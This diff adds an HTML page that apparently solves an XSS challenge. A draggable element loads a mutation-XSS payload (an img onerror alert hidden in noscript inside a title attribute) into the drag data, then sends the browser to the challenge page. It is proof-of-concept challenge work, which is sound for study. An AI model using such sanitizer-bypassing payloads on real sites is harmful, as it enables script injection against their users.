@@ -1,0 +1,35 @@
+
+<!DOCTYPE html>
+<head>
+	<meta charset="utf-8">
+	<style>
+		#drag { 
+		position: absolute;
+		left: 25%;
+		bottom: 5%;
+		font-size: 100px;
+		}
+	</style>
+
+</head>
+<body>
+	<div id='drag' draggable="true">Hold Me 🤗</div>
+
+<script>
+
+var xss = `x<u title='<noscript>"><img src onerror=alert(23)></noscript>'>y`
+
+document.onreadystatechange = () => {
+	if (document.readyState === 'complete') {
+		var x = document.getElementById("drag");
+ 
+			x.addEventListener("dragstart", function(ev){
+			ev.dataTransfer.setData('text/html', xss);
+		location='https://renwax23.github.io/X/xschal1j.html#:~:text=Type%20something'
+		});
+
+	}
+};
+</script>
+</body>
+</html>
